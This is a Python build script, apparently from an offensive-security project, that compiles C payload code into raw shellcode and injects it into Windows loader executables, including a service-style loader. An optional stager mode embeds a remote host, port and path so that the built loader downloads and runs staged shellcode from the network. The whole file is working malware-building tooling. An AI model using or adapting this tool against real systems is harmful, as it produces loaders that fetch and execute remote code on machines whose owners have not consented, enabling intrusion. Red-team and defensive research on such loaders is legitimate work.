#!/usr/bin/env python3
#
# Name  : c-to-shellcode.py
# Author: Print3M
# GitHub: https://github.com/Print3M
import argparse
import os
from pathlib import Path
import subprocess
import sys
from urllib.parse import urlparse


def join_args(arr: list[str]):
    return " ".join(arr)


def run_cmd(cmd: str):
    subprocess.run(cmd, text=True, check=True, shell=True)
    print(f"[+] {cmd}")


LOADER_PAYLOAD_STR = ":PAYLOAD:"

CC = "x86_64-w64-mingw32-gcc-win32"
EXE_PAYLOAD_CFLAGS = join_args([
    "-fPIC",
    "-mconsole",
    "-Os",
    "-DENABLE_DEBUG",
    "-Werror",
    "-Wall",
    "-Wextra",
    "-Wformat",
])
BIN_PAYLOAD_CFLAGS = join_args([
    "-Os",
    "-fPIC",
    "-nostdlib",
    "-nostartfiles",
    "-ffreestanding",
    "-fno-asynchronous-unwind-tables",
    "-fno-ident",
    "-e start",
    "-s",
    "-Werror",
    "-Wall",
    "-Wextra",
])

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Shellcode/stager loader.")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--shellcode-file', type=str, help='Path to shellcode file')
    group.add_argument('--stager-url', type=str, help='URL to fetch staged shellcode from')

    args = parser.parse_args()

    ORIG_CWD = Path(os.getcwd())
    ROOT = Path(__file__).parent
    input_file = Path(ROOT / 'payload.c').absolute()
    os.chdir(ROOT)

    config = Path('assets/config.h').read_text()
    if args.shellcode_file:
        assert os.path.isfile(args.shellcode_file), f"Shellcode file '{args.shellcode_file}' does not exist."
        config = config.replace('<SHELLCODE_HEX>', Path(args.shellcode_file).read_bytes().hex())
    if args.stager_url:
        stager_url = urlparse(args.stager_url)
        config = config.replace('<STAGER_HOST>', stager_url.hostname)
        config = config.replace('13337', str(stager_url.port))
        config = config.replace('<STAGER_PATH>', stager_url.path)
        BIN_PAYLOAD_CFLAGS += ' -DSTAGED'
        EXE_PAYLOAD_CFLAGS += ' -DSTAGED'
    Path('bin/config.h').write_text(config)
    
    output_dir = input_file.parent / 'bin'
    output_file_o = output_dir / f'{input_file.name.rsplit(".")[0]}.o'
    output_file_bin = output_dir / f'{input_file.name.rsplit(".")[0]}.bin'
    output_file_exe = output_dir / f'{input_file.name.rsplit(".")[0]}.exe'
    output_file_loader = output_dir / f'loader.exe'

    # Compile payload C code to object file
    run_cmd(f"{CC} -c {input_file} -o {output_file_o} {BIN_PAYLOAD_CFLAGS}")

    # Produce flat binary with payload
    run_cmd(f"ld -T assets/linker.ld {output_file_o} -o {output_file_bin}")

    # Produce PE .exe with payload (WinAPI included)
    # run_cmd(f"{CC} -c {input_file} -o {output_file_o} {EXE_PAYLOAD_CFLAGS} -DENABLE_LOG_DEBUG")
    # run_cmd(f"{CC} {output_file_o} -o {output_file_exe} {EXE_PAYLOAD_CFLAGS}")
    run_cmd(f"{CC} {input_file} -o {output_file_exe} {EXE_PAYLOAD_CFLAGS}")

    # Convert flat binary into C array of bytes
    with open(output_file_bin, "rb") as f:
        bytes = bytearray(f.read())

    size = len(bytes)
    print(f"[+] Binary payload size: {size} bytes")

    payload = ""
    for byte in bytes:
        payload += "\\" + hex(byte).lstrip("0")

    # Inject payload into loader source code
    for loader in ['loader_exe', 'loader_svc']:
        with open(f"assets/{loader}.c", "r") as f:
            loader_source = f.read()

        loader_source = loader_source.replace(LOADER_PAYLOAD_STR, payload)

        with open(f"bin/{loader}.c", "w") as f:
            f.write(loader_source)

        # Compile loader
        run_cmd(f"{CC} bin/{loader}.c -o {output_dir / f'{loader}.exe'} -static")

    print("")
    if ORIG_CWD in output_dir.parents:
        output_dir_rel = output_dir.relative_to(ORIG_CWD)
    else:
        output_dir_rel = output_dir # fallback
    print(f"[+] Outputs in {output_dir_rel} are ready!")
